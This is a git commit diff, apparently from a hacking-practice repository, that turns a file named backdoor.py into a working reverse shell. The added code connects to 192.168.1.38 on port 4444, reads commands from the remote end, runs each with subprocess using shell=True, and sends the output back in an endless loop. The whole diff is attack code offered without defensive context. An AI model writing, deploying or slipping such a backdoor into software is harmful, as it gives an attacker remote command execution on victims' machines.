ed0160b058431ef0e504019af39dc4cae9545daa
Hem Parekh <54116609+Hem1700@users.noreply.github.com>
2021-05-04 16:38:46 +0530

    Executing system commnads remotly

--- backdoor.py
+++ backdoor.py
@@ -1,20 +1,20 @@
 #!/usr/bin/env python
 
 import socket
+import subprocess
+
+
+def execute_system_command(command):
+    return subprocess.check_output(command, shell=True)
 
 connection = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
 connection.connect(("192.168.1.38", 4444))
-
 connection.send("\n[+] Connection established.\n".encode())
 
-
-recieved_data = connection.recv(1024)
-print(recieved_data)
-
-
-
-
-
+while True:
+    command = connection.recv(1024).decode()
+    command_result = execute_system_command(command)
+    connection.send(command_result)
 
 connection.close()
 
